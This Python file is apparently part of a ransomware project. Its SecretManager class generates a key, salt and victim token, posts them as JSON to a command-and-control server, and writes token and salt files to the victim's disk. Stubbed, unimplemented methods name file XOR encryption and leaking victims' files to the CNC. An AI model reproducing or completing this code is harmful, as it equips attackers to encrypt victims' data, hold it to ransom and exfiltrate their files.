from hashlib import sha256
import logging
import secrets
from os import path, urandom
from pathlib import Path
from typing import List, Tuple
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


from xorcrypt import xorfile


class SecretManager:
    KDF_ITERATION_NUMBER = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = b''
        self._salt = b''
        self._token = b''
        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt: bytes, key: bytes) -> None:
        self._salt = salt
        KDF = PBKDF2HMAC(algorithm = hashes.SHA256(),
                         length = SecretManager.KEY_LENGTH,
                         salt = self._salt,
                         iterations = SecretManager.KDF_ITERATION_NUMBER)
        self._key = KDF.derive(key)
        self._token = secrets.token_bytes(SecretManager.TOKEN_LENGTH) 
        return None
   
    def create(self) -> Tuple[bytes, bytes, bytes]:
        self.do_derivation(urandom(SecretManager.SALT_LENGTH), urandom(SecretManager.KEY_LENGTH))
        self._log.debug((self._token, self._key, self._salt))
        return (self._salt, self._key, self._token)

    def bin_to_b64(self, data: bytes) -> str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        # register the victim to the CNC
        secrets_json = {
                "salt": self.bin_to_b64(salt),
                "key": self.bin_to_b64(key),
                "token": self.bin_to_b64(token),
                }
        header = {"Content-Type":"application/json"}
        self._log.debug(secrets_json)
        # self._log.debug(headers)
        url = 'http://' + self._remote_host_port + '/new?token=' + str(int.from_bytes(token))
        requests.post(url, json = secrets_json, headers=header)
        return None

    def setup(self) -> None:
        # main function to create crypto data and register malware to cnc
        self.create()
        self.post_new(self._salt, self._key, self._token)
        if not Path(self._path).exists():  
            Path(self._path).mkdir(parents=True, exist_ok=True)
        if Path(self._path + '/token.bin').exists():
            raise FileExistsError
        """
        open taking parameter 'wb' allows the program to write into a binary file
        """
        with open(self._path + '/token.bin', 'wb') as token_binary_file:
            token_binary_file.write(self._token)
        with open(self._path + '/salt.bin', 'wb') as salt_binary_file:
            salt_binary_file.write(self._salt)

        return None

    def load(self) -> None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key: bytes) -> bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key: str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        raise NotImplemented()

    def xorfiles(self, files: List[str])->None:
        # xor a list for file
        raise NotImplemented()

    def leak_files(self, files: List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()
